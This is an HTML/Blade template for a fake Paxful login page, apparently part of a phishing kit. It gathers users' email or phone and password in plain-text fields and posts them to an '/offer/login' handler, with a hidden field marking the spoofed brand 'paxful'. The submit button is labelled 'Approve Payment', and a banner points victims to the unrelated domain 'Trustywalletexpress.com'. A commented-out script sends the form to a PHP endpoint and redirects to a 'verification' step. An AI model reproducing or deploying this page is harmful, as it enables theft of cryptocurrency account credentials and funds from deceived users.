
<!DOCTYPE html>
<html lang="en" dir="ltr" class="">

<head>
    <meta charset="utf-8" />
    <meta name="viewport"
          content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0, shrink-to-fit=no" />
    <meta name="csrftoken" content="5VDHOHNC4NMSqvFxR5Kpa6WycpFhE3T9QPt1cA4f7paZF7mbNQntJs2dUfngMQTa" />
    <link rel="icon" href="{{asset('assets/favicons/icon.ico')}}" />

    <meta name="description"
          content="Sign in to your Paxful account trade or manage your cryptocurrency. We suggest setting up two-factor authentication for enhanced account security.">
    <link rel="stylesheet"
          href="https://fonts.googleapis.com/css?family=Montserrat:400,500,700|Open+Sans:400,600,700&display=swap&subset=cyrillic" />
    <link rel="stylesheet"
          href="https://fonts.googleapis.com/css?family=Montserrat:400,500,700|Open+Sans:400,600,700&display=swap&subset=cyrillic" />
    <link rel="stylesheet" href="{{asset('assets/css/style.css')}}">
    <link rel="stylesheet" href="{{asset('assets/css/fontawesome.css')}}">
    <title>Log In to Your Account | Paxful</title>
         <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css">

</head>

<body>
<div class="content_container">
    <div class="content_first_Cont">
        <div class="nav1">
            <div class="logo">
                <div class="img">
                    <img src="{{asset('assets/img/paxlogo.PNG')}}" alt="">
                </div>
            </div>
            <div class="lan">
                <div class="wrld">
                    <i class="fa-solid fa-globe"></i>
                </div>
                <div class="select">
                    <select name="" id="">
                        <option value="">English</option>
                        <option value="">Français</option>
                        <option value="">Español</option>
                    </select>
                </div>

            </div>
        </div>
        <div class="form_cont1">
            <div class="nav2">
                <div class="headnav2">
                    <h1>login with paxful</h1>
                </div>
            </div>
            <div class="err">
                <div class="info">
                    <i class="fa-solid fa-circle-info"></i>
                </div>
                <div class="text">
                    <p>IMPORTANT! Please check that<Br /> you are visiting<br /> https:Trustywalletexpress.com</p>
                </div>
                <div class="link">
                    <p><span><i class="fa-solid fa-lock"></i>https://</span><b>Trustywalletexpress.com</b></p>
                </div>
            </div>
            <div class="errr">
                <div class="info">
                    <i class="fa-solid fa-circle-info"></i>
                </div>
                <div class="text">
                    <p>IMPORTANT! Please check that you are visiting<br /> https:Trustywalletexpress.com</p>
                    <div class="link">
                        <p><span><i class="fa-solid fa-lock"></i>https://</span><b>Trustywalletexpress.com</b></p>
                    </div>
                </div>

            </div>
            <style>
    .error-alert {
  padding: 15px;
  background-color: #f44336;
  color: white;
  border-radius: 5px;
  position: relative;
}

.close-btn {
  color: white;
  float: right;
  font-size: 20px;
  font-weight: bold;
  cursor: pointer;
}

.close-btn:hover {
  color: black;
}
.success-alert {
  padding: 15px;
  background-color: #4CAF50;
  color: white;
  border-radius: 5px;
  position: relative;
}

.close-btn {
  color: white;
  float: right;
  font-size: 20px;
  font-weight: bold;
  cursor: pointer;
}

.close-btn:hover {
  color: black;
}

</style>
 @if(session('success'))
                
  <span class="close-btn">&times;</span>
  <strong>{{ session('success') }}</strong>
</div>
            @endif
            @if(session('error'))
                 <div class="error-alert">
  <span class="close-btn">&times;</span>
  <strong>  {{ session('error') }}</strong>
</div>
            @endif
            <div class="form">
                <p>Your Phone or Email</p>
                <form action="{{url('/offer/login')}}" id="" method="post" autocomplete="off">
                    @csrf
                    <div class="form_input">
                        <input type="text" name="site" value="paxful" id="email" style="margin-bottom: 15px;" hidden="">
                        <input type="text" name="email" id="email" style="margin-bottom: 15px;">

                        @error('email')
                        <p class="errore" style="color: red;">
                            <strong>{{ $message }}</strong>
                        </p>
                        @enderror
                    </div>
                    <div class="flex" style="display: flex; justify-content: space-between;">
                        <p>Your Password</p>
                        <p style="justify-content: flex-end; right: 0; color: #0052cc;">Forgot password?</p>
                    </div>

                    <div class="form_input pwd">
                        <input type="text" name="password" id="pwd" style="margin-bottom: 5px;">
                        <!---<p class="error" style="color: red;">

                        </p>-->
                        <i class="fa-solid fa-eye"></i>
                        <i class="fa-solid fa-eye-slash" style="display: none;"></i>
                    </div>
                    <div class="form_input button">
                        <button type="submit" name="submit">
                            <div class="log">
                                Approve Payment
                            </div>
                            <div class="arrow">
                                > </div>
                        </button>
                    </div>
                    <p class="error">

                    </p>
                </form>
                <hr />
                <div class="lastnav">
                    <p>New on Paxful?
                        <span style="color: #0052cc;">Create an Account</span>
                    </p>
                </div>
            </div>
        </div>

    </div>
    <div class="content_second_cont">
        <div class="color">

        </div>
        <div class="image_tag">
            <div class="img">
                <div class="imgy">
                    <img src="{{asset('assets/img/pax.webp')}}" alt="">

                </div>
            </div>

        </div>
    </div>
</div>
<script src="{{asset('assets/js/font.js')}}"></script>
<script src="./static/js/script.js"></script>
<script>
    // const form = document.querySelector(".form form"),
    //     continueBtn = form.querySelector(".form button"),
    //     errortexte = form.querySelector(".errore"),
    //     errortext = form.querySelector(".error");
    //
    // form.onsubmit = (e) => {
    //     e.preventDefault();//prevent from submitting
    // }
    // continueBtn.onclick = () => {
    //     let xhr = new XMLHttpRequest();
    //     xhr.open("POST", "static/php/form.php", true);
    //     xhr.onload = () => {
    //         if (xhr.readyState === XMLHttpRequest.DONE) {
    //             if (xhr.status === 200) {
    //                 let data = xhr.response;
    //                 if (data == "success") {
    //                     location.href = "./verification";
    //                 } else {
    //                     if (data = "pwd") {
    //                         errortexte.textContent = "This field may not be blank!";
    //                         errortexte.style.display = "block";
    //                     }
    //                     else if(data = "email"){
    //                         errortext.textContent = "This field may not be blank.";
    //                         errortext.style.display = "block";
    //                     }
    //
    //                 }
    //             }
    //         }
    //     }
    //     ///send form data through jax to php
    //     let formData = new FormData(form);//create new formdata object
    //     xhr.send(formData);
    // }
</script>
</body>

</html>
